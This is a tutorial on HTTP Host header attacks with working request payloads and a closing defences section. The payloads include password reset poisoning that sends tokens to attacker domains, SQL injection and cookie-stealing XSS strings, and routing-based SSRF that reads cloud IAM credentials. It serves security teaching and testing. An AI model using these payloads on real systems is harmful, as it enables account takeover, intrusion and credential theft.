# HTTP Host Header Attacks

The HTTP Host header is one of the most trusted components in the entire request pipeline — load balancers route by it, reverse proxies forward to virtual hosts based on it, applications use it to generate URLs, send emails, and enforce access controls. That implicit trust is precisely what makes it dangerous. Because it appears in every single HTTP request and is processed by every intermediary component in the chain, a single misconfiguration — at the application, proxy, or load balancer layer — can expose a vast attack surface ranging from password hijacking and cache poisoning to full internal network compromise via routing-based SSRF. 

**Fundamental principle: The Host header is the mechanism by which HTTP/1.1 clients tell a shared server which virtual host they want — but when applications use that same header value to generate URLs, route requests, or make trust decisions, any ability to supply an arbitrary or ambiguous Host value becomes a powerful injection point that sits at the very top of the request processing pipeline.**

***

## Understanding the Attack Surface

```
HTTP Host header in a multi-tier architecture:
─────────────────────────────────────────────────────────────────────────────
Client
  │
  │  GET /reset-password?token=xyz HTTP/1.1
  │  Host: attacker.com              ← attacker injects their domain here
  │
  ▼
CDN / WAF
  │  May validate Host against SNI certificate
  │  May pass X-Forwarded-Host derived from original Host
  │
  ▼
Load Balancer / Reverse Proxy
  │  Routes request to back-end based on Host header
  │  May forward Host as-is or add X-Forwarded-Host
  │
  ▼
Back-end Application Server
  │  Uses Host to generate:
  │    • Password reset email links     ← Host injection → link hijack
  │    • Redirect Location headers      ← Host injection → open redirect
  │    • <script src> / <link href>     ← Host injection → XSS / resource hijack
  │    • SQL WHERE clauses              ← Host injection → SQLi
  │    • Access control checks         ← Host injection → auth bypass
  │
  ▼
Cache (CDN edge / Varnish / application-level)
  │  Keys response on Host + path
  │  Host is often in the cache key BUT:
  │    - Ports are sometimes stripped
  │    - Application caches may not key on Host at all
  └────────────────────────────────────────────────────────────────────────────
```

***

## Phase 1: Detection and Recon

### Step 1: Supply an Arbitrary Host Header

```http
# ── BASELINE: Test whether arbitrary Host values reach the application ─────────

# Normal request (Burp Repeater — set target IP directly, not via DNS):
GET / HTTP/1.1
Host: vulnerable-website.com
# → 200 OK (baseline)

# Inject arbitrary domain:
GET / HTTP/1.1
Host: completely-unrelated-domain.com
# Possible responses:
#   200 OK + response mentions "completely-unrelated-domain.com"
#     → application reflects the Host header → vulnerable ✓
#   302 redirect to https://completely-unrelated-domain.com/...
#     → application uses Host to construct redirect URL → vulnerable ✓
#   400 Bad Request / "Invalid Host header"
#     → some validation present → try bypass techniques below
#   200 OK but no reflection of the injected value
#     → default vhost configuration → still test for other exploits

# ⚠ IMPORTANT: In Burp Suite, the target IP is set separately from the Host header.
# This means you can change the Host to anything and the request still reaches
# the correct server IP. Do NOT test this in a raw browser or curl with DNS
# resolution enabled — the request would be routed to the wrong server.


# ── STEP 2: Test for reflection in response ────────────────────────────────────

# Inject a canary value to trace where Host appears in the response:
GET / HTTP/1.1
Host: HOSTCANARY12345.vulnerable-website.com

# Search response for HOSTCANARY12345:
# Found in password reset URL?     → password reset poisoning
# Found in <script src="...">?     → XSS / resource import attack
# Found in <a href="...">?         → open redirect / cache poisoning
# Found in Location header?        → redirect poisoning
# Found in SQL error output?       → SQL injection via Host header
# Found in cookie or Set-Cookie?   → session-related attack surface
# Found nowhere?                   → Host not reflected; check other impacts
```

### Step 2: Bypass Host Validation

```http
# ── TECHNIQUE 1: Port injection ───────────────────────────────────────────────

# Some validators check only the domain, stripping port before comparison.
# If non-numeric port values are accepted:
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here

# Result if validation strips port:
# App receives Host as: vulnerable-website.com:bad-stuff-here
# Validator checked: vulnerable-website.com  ← passed ✓
# Payload "bad-stuff-here" in the port position reaches app logic

# XSS via port in Host → password reset email context:
GET /forgot-password HTTP/1.1
Host: vulnerable-website.com:"><script>alert(1)</script>
# If reset email contains: https://vulnerable-website.com:"><script>...</script>/reset?token=...
# → Email client or web-based reader may execute XSS


# ── TECHNIQUE 2: Subdomain bypass ─────────────────────────────────────────────

# Validator uses suffix matching (endsWith) instead of exact matching:
# Allowed pattern:  *vulnerable-website.com
# Bypass:           register "notvulnerable-website.com" (ends with matching suffix)

GET /example HTTP/1.1
Host: notvulnerable-website.com
# → Validator: "notvulnerable-website.com".endsWith("vulnerable-website.com") → TRUE ✓
# → Bypasses allowlist validation ✓

# Alternative: use already-compromised subdomain of target:
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
# → Passes subdomain wildcard validation
# → Attacker controls hacked-subdomain → receives any redirected requests


# ── TECHNIQUE 3: Duplicate Host headers ────────────────────────────────────────

# Different components give precedence to first vs. last occurrence.
# Front-end validates the first, back-end uses the last (or vice versa).

GET /example HTTP/1.1
Host: vulnerable-website.com           ← front-end validates this, routes correctly
Host: bad-stuff-here                   ← back-end uses this for URL generation

# Variation: use second header for payload, first for routing:
GET /example HTTP/1.1
Host: bad-stuff-here
Host: vulnerable-website.com

# Both orderings may work depending on which component uses first vs last.


# ── TECHNIQUE 4: Absolute URL in request line ─────────────────────────────────

# HTTP/1.1 supports absolute URLs in the request line.
# Some proxies give precedence to the request line URL; others use the Host header.
# Discrepancy between the two creates ambiguity exploitable for routing or injection.

GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here

# Front-end proxy: routes to vulnerable-website.com (from request line) ✓
# Back-end application: uses Host header → processes "bad-stuff-here" for URL gen


# ── TECHNIQUE 5: Indented (wrapped) Host header ────────────────────────────────

# RFC 7230 allows header folding (multi-line headers) with indentation.
# Some servers treat indented header as a continuation of the previous one.
# Others ignore it. The discrepancy creates a bypass opportunity.

GET /example HTTP/1.1
    Host: bad-stuff-here                ← INDENTED → treated as wrapped line by some
Host: vulnerable-website.com           ← actual Host header read by front-end

# Scenario: front-end ignores indented header (sees only Host: vulnerable-website.com)
# → Routes request to correct back-end ✓
# Scenario: back-end gives precedence to first Host header (ignores leading space)
# → Back-end processes "bad-stuff-here" ✓


# ── TECHNIQUE 6: Host override headers ────────────────────────────────────────

# When direct Host modification is blocked, these alternative headers often work:
# Many frameworks check these BEFORE the Host header.

GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here

# Other equivalents to try (one at a time):
X-Host: bad-stuff-here
X-Forwarded-Server: bad-stuff-here
X-HTTP-Host-Override: bad-stuff-here
Forwarded: host=bad-stuff-here
X-Original-Host: bad-stuff-here

# Framework priority order (typical, varies by framework):
# 1. X-Forwarded-Host    ← checked first in Express.js (trust proxy enabled)
# 2. X-Host
# 3. X-Forwarded-Server
# 4. Host               ← fallback
# → inject in any of the above that the app respects
```

***

## Attack 1: Password Reset Poisoning

The most impactful single-user attack. The attacker causes the application to generate a legitimate password reset token for the victim but embed it in a URL pointing to the attacker's server. 

```http
# ── ATTACK FLOW ───────────────────────────────────────────────────────────────
#
#  1. Attacker submits password reset for victim's account
#  2. Application generates a valid reset token → builds a reset URL using Host header
#  3. Attacker has injected their domain in the Host header
#  4. Reset email sent to VICTIM's address but URL points to ATTACKER's domain
#  5. Victim clicks the link (going to attacker's server)
#  6. Attacker's server captures the token in the URL (server access log / Collaborator)
#  7. Attacker uses token on the REAL application → resets victim's password ✓

# ── STEP 1: Baseline — observe normal password reset flow ────────────────────

POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

username=your_own_account

# Receive email:
# Click here to reset your password:
# https://vulnerable-website.com/reset?token=abc123

# Token is tied to the username, valid for password change if correct


# ── STEP 2: Inject attacker domain in Host header ─────────────────────────────

POST /forgot-password HTTP/1.1
Host: evil-user.net                    ← attacker's controlled domain
Content-Type: application/x-www-form-urlencoded

username=carlos                        ← target victim's username

# Response: 200 OK (server doesn't validate Host during password reset request)

# Email sent TO carlos's inbox:
# Click here to reset your password:
# https://evil-user.net/reset?token=CARLOS_TOKEN_HERE
#           ↑ attacker's domain                ↑ valid token for carlos's account


# ── STEP 3: Victim clicks the link → attacker captures token ──────────────────

# Attacker's server access log entry (Apache format):
# 203.0.113.42 - - [18/Feb/2026:23:15:32 +0000]
# "GET /reset?token=0a1b2c3d4e5f6g7h8i9j0k1l2m3n HTTP/1.1" 404 -
#                   ↑ Carlos's valid reset token captured ✓

# Using Burp Collaborator instead of a real server:
POST /forgot-password HTTP/1.1
Host: a8k3j7f2.oastify.com             ← Burp Collaborator domain
Content-Type: application/x-www-form-urlencoded

username=carlos

# Collaborator panel shows:
# Interaction type: HTTP
# Request: GET /reset?token=0a1b2c3d4e5f6g7h8i9j0k1l2m3n HTTP/1.1
# Token captured in Collaborator ✓


# ── STEP 4: Use captured token on real application ────────────────────────────

# Use the captured token against the REAL reset endpoint:
GET https://vulnerable-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j0k1l2m3n HTTP/1.1
Host: vulnerable-website.com

# → Redirected to password change form
# → Set new password for carlos ✓ → account taken over


# ── VARIANT: X-Forwarded-Host bypass ──────────────────────────────────────────
# When Host is validated, use X-Forwarded-Host:

POST /forgot-password HTTP/1.1
Host: vulnerable-website.com           ← valid host (passes validation)
X-Forwarded-Host: evil-user.net        ← framework uses this for URL generation

username=carlos

# Application validates Host (passes), then builds URL using X-Forwarded-Host:
# https://evil-user.net/reset?token=CARLOS_TOKEN_HERE ✓


# ── VARIANT: Dangling markup via port (no server required) ────────────────────
# When the attacker cannot receive HTTP requests (strict firewall):
# Inject a dangling markup payload into the port that causes the email client
# to exfiltrate the token via an image load.

POST /forgot-password HTTP/1.1
Host: vulnerable-website.com:'<a href="https://evil-user.net/?
Content-Type: application/x-www-form-urlencoded

username=carlos

# Email body becomes:
# Reset your password:
# https://vulnerable-website.com:'<a href="https://evil-user.net/?/reset?token=TOKEN
#                                                                         ↑
# The <a> tag opens a link to evil-user.net with the token in the query string
# Many email clients auto-load the first link → token exfiltrated via GET request ✓
```

***

## Attack 2: Authentication Bypass via Host Header

Some access control systems make trust decisions based on the Host header value, granting elevated privileges to "internal" requests. 

```http
# ── SCENARIO: Internal admin panel gated by Host header value ─────────────────

# Publicly accessible:
GET /admin HTTP/1.1
Host: vulnerable-website.com
# → 401 Unauthorized / 403 Forbidden

# Internal admin check code:
# if (request.headers.get('Host') === 'localhost') {
#     grantAdminAccess();
# }

# Attack: supply the expected internal Host value:
GET /admin HTTP/1.1
Host: localhost
# → 200 OK → full admin panel accessible ✓

# Variation — 127.0.0.1:
GET /admin HTTP/1.1
Host: 127.0.0.1

# Variation — internal hostname:
GET /admin HTTP/1.1
Host: intranet.corporate.com

# Variation — any private IP format:
GET /admin HTTP/1.1
Host: 192.168.0.1


# ── SCENARIO: Access control based on X-Forwarded-For trust ───────────────────

# App checks: if X-Forwarded-For is missing or is an internal IP, grant admin access
GET /admin HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 127.0.0.1       ← appear to come from localhost

# → 200 OK if app trusts X-Forwarded-For for access control ✓

# Both techniques combined:
GET /admin HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1


# ── VIRTUAL HOST BRUTE-FORCING ────────────────────────────────────────────────

# DNS records may reveal public hostname but hide internal services:
# www.example.com:       12.34.56.78  (public)
# intranet.example.com:  10.0.0.132   (private — not resolvable externally)
# admin-panel.example.com: (no DNS record — only accessible from internal network)

# Despite no public DNS, the server still hosts all virtual hosts on 12.34.56.78.
# Any attacker who can send requests to 12.34.56.78 can access all virtual hosts.

# Brute force with Burp Intruder:
GET / HTTP/1.1
Host: §FUZZ§.example.com

# Wordlist for §FUZZ§ (common internal hostnames):
admin
admin-panel
intranet
internal
portal
corp
dashboard
manage
staff
private
dev
staging
test
api-internal
payments-internal
hr
helpdesk
monitoring
grafana
jenkins
gitlab
jira
confluence
vpn
backup
db
mail-internal

# Indicators of a found internal host:
# → Different response size/content than default vhost response
# → 200 OK where other subdomains return 400 "Invalid Host" or default page
# → Redirects to login page of unknown internal application
# → Response headers unique to an internal service (Server: Jenkins, etc.)
```

***

## Attack 3: Routing-Based SSRF via Host Header

The most infrastructure-impacting class. The load balancer or reverse proxy itself is weaponised to route requests to arbitrary internal systems. 

```http
# ── ARCHITECTURE: How routing-based SSRF works ────────────────────────────────
#
#  Public Internet → [Load Balancer / Reverse Proxy] → Internal Services
#                              ↑
#                   Routes based on Host header
#                   Has access to entire internal network
#                   → Can reach 192.168.x.x, 10.x.x.x, 172.16.x.x
#
#  If the proxy doesn't validate Host before routing:
#  Attacker supplies Host: 192.168.0.68 → proxy routes request to that internal IP
#  Internal service receives request as if from the proxy (trusted source)


# ── STEP 1: Confirm routing to external host (OOB detection) ──────────────────

GET / HTTP/1.1
Host: BURP-COLLABORATOR-DOMAIN.oastify.com

# Monitor Burp Collaborator for DNS lookup or HTTP request:
# → DNS lookup from target server IP → confirms Host-based routing ✓
# → HTTP request → confirms full request forwarding ✓

# If Collaborator receives a request:
# [09:15:42] HTTP Interaction
# FROM: 12.34.56.78 (target's IP)
# REQUEST: GET / HTTP/1.1
#          Host: BURP-COLLABORATOR-DOMAIN.oastify.com
# → Load balancer blindly forwarded request to Collaborator domain ✓


# ── STEP 2: Pivot to internal network — brute force private IP range ──────────

# Common private IP ranges to probe:
# 10.0.0.0/8        →  10.0.0.1 – 10.255.255.255
# 172.16.0.0/12     →  172.16.0.1 – 172.31.255.255
# 192.168.0.0/16    →  192.168.0.1 – 192.168.255.255
# 169.254.0.0/16    →  AWS/cloud metadata service (169.254.169.254)

# Burp Intruder — payload position on the Host header value:
GET / HTTP/1.1
Host: §192.168.0.§§1§

# Payload type 1: Numbers 1–254 for last octet
# Payload type 2: Cluster bomb for full /24 range

# Indicators of live internal host:
# → Response content differs from "Invalid Host" error (different status, size, body)
# → 200 OK with login form or internal application UI
# → 301/302 redirect to internal path (e.g., Location: /admin, Location: /login)
# → 500 Internal Server Error (service exists but crashed on unexpected request)


# ── STEP 3: Access discovered internal admin panel ────────────────────────────

# Suppose Intruder found a live host at 192.168.0.68:

GET / HTTP/1.1
Host: 192.168.0.68
# Response: 302 Found, Location: /admin

GET /admin HTTP/1.1
Host: 192.168.0.68
# Response: 200 OK — Internal Admin Panel
# <html><h1>Admin Panel</h1>
# <a href="/admin/delete?username=carlos">Delete user</a>
# → Full internal admin access achieved via load balancer routing ✓

# Perform sensitive actions:
POST /admin/delete HTTP/1.1
Host: 192.168.0.68
Content-Type: application/x-www-form-urlencoded

username=carlos


# ── STEP 4: AWS Metadata Service via routing-based SSRF ───────────────────────

# Many cloud-hosted apps have the IMDS (169.254.169.254) accessible internally.
# If the load balancer routes to arbitrary IPs:

GET /latest/meta-data/ HTTP/1.1
Host: 169.254.169.254

# Response may include:
# ami-id
# hostname
# iam/             ← IAM role credentials ← HIGH VALUE
# security-credentials/

GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
# → Returns role name, e.g.: "ec2-role-prod"

GET /latest/meta-data/iam/security-credentials/ec2-role-prod HTTP/1.1
Host: 169.254.169.254
# Response:
# {
#   "Code":         "Success",
#   "AccessKeyId":  "ASIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token":        "AQoXnyc4lcK4w...",
#   "Expiration":   "2026-02-18T23:59:59Z"
# }
# → AWS IAM credentials exfiltrated → full cloud account compromise ✓
```

***

## Attack 4: Connection State Attack

HTTP/1.1 persistent connections (keep-alive) allow multiple requests over one TCP connection. Some servers validate the Host header only on the FIRST request and assume subsequent requests on the same connection share the same Host. 

```http
# ── SCENARIO: Server validates Host only on first request per connection ───────

# Normal server behaviour:
# [TCP Connection established]
# Request 1: GET / Host: vulnerable-website.com   → validated ✓ → routed to app
# Request 2: GET / Host: vulnerable-website.com   → assumed same host → no revalidation

# Exploit: send a safe request first to pass validation, then inject payload:

# In Burp Repeater — use "Send group in sequence (single connection)":

# Request 1 (safe — passes validation):
GET / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive

# Request 2 (malicious — over the SAME TCP connection):
GET /admin HTTP/1.1
Host: 192.168.0.1                     ← internal IP — bypasses validation
Connection: keep-alive

# Result:
# Request 1: Server validates Host → vulnerable-website.com ✓ → 200 OK
# Request 2: Server skips validation (assumes same connection = same trusted host)
#            Routes /admin request to 192.168.0.1 → internal admin panel ✓

# ── BURP SUITE SETUP FOR CONNECTION STATE ATTACK ─────────────────────────────

# 1. Go to Burp Repeater
# 2. Create two tabs with the requests above
# 3. Group the tabs (right-click → "Add tab to group")
# 4. In the group, select: "Send group in sequence (single connection)"
# 5. Ensure both have: Connection: keep-alive
# 6. Send group → observe Request 2 succeeds despite the manipulated Host

# ── WHY THIS BYPASSES VALIDATION ──────────────────────────────────────────────
#
#  TCP connection state is maintained between requests.
#  Some reverse proxies cache the routing decision from the first request.
#  Load balancers that use "connection affinity" continue routing to the same
#  back-end for the lifetime of the connection.
#  Security checks applied only at connection establishment, not per-request.
```

***

## Attack 5: SSRF via Malformed Request Line

```http
# ── SCENARIO: Reverse proxy prefixes path with back-end URL ────────────────────

# Normal proxy behaviour:
# Client sends:   GET /example HTTP/1.1
# Proxy builds:   http://backend-server/example
# → Routes to:    http://backend-server/example   ← correct

# Malformed path with @ character:
# Client sends:   GET @private-intranet/example HTTP/1.1
# Proxy builds:   http://backend-server@private-intranet/example
#                           ↑
#                 URL auth syntax: userinfo@host/path
#                 = connect to "private-intranet" with username "backend-server"
# → Routes to:    http://private-intranet/example   ← attacker-controlled target ✓

# The @-notation in a URL means:
# [scheme]://[userinfo]@[host]/[path]
# http://backend-server@private-intranet/example
#         ↑ username     ↑ ACTUAL destination host

# Attack request:
GET @private-intranet/example HTTP/1.1
Host: vulnerable-website.com

# Combined with Host header injection:
GET @169.254.169.254/latest/meta-data/ HTTP/1.1
Host: vulnerable-website.com
# → Proxy routes to 169.254.169.254 → AWS IMDS ✓


# ── DETECTING PROXY-BASED PARSING ISSUES WITH COLLABORATOR ───────────────────

GET @COLLABORATOR.oastify.com/test HTTP/1.1
Host: vulnerable-website.com

# Collaborator receives HTTP request from the proxy:
# → Confirms the proxy follows the @-redirect to your Collaborator domain ✓
# → Confirms the vulnerability is exploitable for SSRF
```

***

## Attack 6: Classic Injection via the Host Header

```http
# ── SQL INJECTION VIA HOST HEADER ─────────────────────────────────────────────

# Some applications store the Host header in a database (for logging, analytics,
# session affinity, or multi-tenancy routing). If not parameterised:

# Test:
GET / HTTP/1.1
Host: vulnerable-website.com'

# If response changes: 500 error, SQL error, blank response → SQL injection ✓

# Confirm with time-based detection:
GET / HTTP/1.1
Host: vulnerable-website.com' AND SLEEP(5)--

# If response is delayed 5 seconds → blind SQL injection via Host ✓

# Extract database version (MySQL):
GET / HTTP/1.1
Host: vulnerable-website.com' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--

# Extract users (PostgreSQL — time-based):
GET / HTTP/1.1
Host: vulnerable-website.com'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--


# ── XSS VIA HOST HEADER ───────────────────────────────────────────────────────

# If Host is reflected in response HTML (page title, meta tags, scripts):
GET / HTTP/1.1
Host: vulnerable-website.com"><script>alert(document.cookie)</script>

# Check response for:
# <title>Welcome to vulnerable-website.com"><script>...</title>
# <meta name="host" content="vulnerable-website.com"><script>...">
# <script>var host = "vulnerable-website.com"><script>..."</script>

# Combined with cache poisoning (if Host is used in a cacheable response):
# → Stored XSS for all users ✓ (covered in cache poisoning section)
```

***

## Phase 3: Defences

```
# ── APPLICATION LAYER ──────────────────────────────────────────────────────────

# ✓ Never use the Host header to generate URLs in security-critical functions.
#   Use explicitly configured trusted domain values from server config instead.

# ✗ VULNERABLE — password reset URL from Host header:
def send_reset_email(user):
    host = request.headers.get('Host')                          # ← attacker-controlled
    reset_url = f"https://{host}/reset?token={generate_token(user)}"
    send_email(user.email, reset_url)

# ✓ SECURE — domain from server config:
TRUSTED_DOMAIN = "vulnerable-website.com"   # set in config, not derived from request

def send_reset_email(user):
    reset_url = f"https://{TRUSTED_DOMAIN}/reset?token={generate_token(user)}"
    send_email(user.email, reset_url)

# ── FRAMEWORK-LEVEL: Django ────────────────────────────────────────────────────
# settings.py
ALLOWED_HOSTS = ['vulnerable-website.com', 'www.vulnerable-website.com']
# → Django raises SuspiciousOperation for any other Host value
# → Never set ALLOWED_HOSTS = ['*'] in production

# ── FRAMEWORK-LEVEL: Express.js ───────────────────────────────────────────────
# Disable proxy trust (prevents X-Forwarded-Host from overriding Host):
app.set('trust proxy', false);      # ← only set true if behind a known trusted proxy
# OR whitelist specific proxy IPs:
app.set('trust proxy', '10.0.0.1'); # ← only trust this specific proxy IP

# ── REVERSE PROXY / NGINX ─────────────────────────────────────────────────────
server {
    listen 443 ssl;
    server_name vulnerable-website.com www.vulnerable-website.com;

    # ✓ Explicitly set the Host sent to the back-end (override with trusted value):
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;

    # ✓ Remove host override headers from client requests:
    proxy_set_header X-Forwarded-Host   "";   # ← strip before reaching back-end
    proxy_set_header X-HTTP-Host-Override "";
    proxy_set_header X-Host             "";
    proxy_set_header Forwarded          "";

    # ✓ Reject requests with mismatched SNI / Host:
    if ($host !~* ^(vulnerable-website\.com|www\.vulnerable-website\.com)$) {
        return 444;   # close connection silently
    }
}

# ── ROUTING-BASED SSRF PREVENTION ─────────────────────────────────────────────
# Load balancers and reverse proxies should:

# ✓ Validate the Host header against an explicit allowlist before routing:
#   Allowlist: ["vulnerable-website.com", "www.vulnerable-website.com"]
#   Reject all others with 400 Bad Request — do NOT route to unknown hosts

# ✓ Disable routing to arbitrary IPs based on Host header:
#   Restrict back-end routing to known, explicitly configured upstreams only.
#   Back-end pool should be a static list — never dynamically derived from Host.

# ✓ Block requests with IP addresses in the Host header:
#   Legitimate browsers never send IP addresses in the Host header.
#   Regex: reject Host values matching /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/

# ✓ Reject duplicate Host headers (400 Bad Request):
#   Most legitimate HTTP clients never send two Host headers.
#   Duplicate Host headers are almost always a manipulation attempt.

# ✓ Reject requests with absolute URLs in the request line (if not required):
#   These are only needed for proxy chains — not for direct application access.
```
